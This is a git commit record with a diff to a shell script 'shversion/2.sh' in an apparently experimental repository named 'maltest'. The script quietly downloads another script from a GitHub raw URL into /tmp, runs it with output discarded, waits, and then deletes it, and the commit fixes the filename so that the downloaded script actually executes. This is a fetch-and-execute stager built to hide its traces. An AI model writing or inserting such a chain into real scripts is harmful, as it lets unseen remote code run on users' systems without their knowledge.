3589d35c376da7e059978f2753224bb0bad0888a
Airplane <84548624+AirplaneA220@users.noreply.github.com>
2024-08-15 21:31:35 -0500

    Update 2.sh

--- shversion/2.sh
+++ shversion/2.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 curl https://raw.githubusercontent.com/AirplaneA220/maltest/Main/shversion/3.sh 2>/dev/null > /tmp/3.sh
-sh /tmp/3. > /dev/null
+sh /tmp/3.sh > /dev/null
 sleep 3
 rm /tmp/3.sh
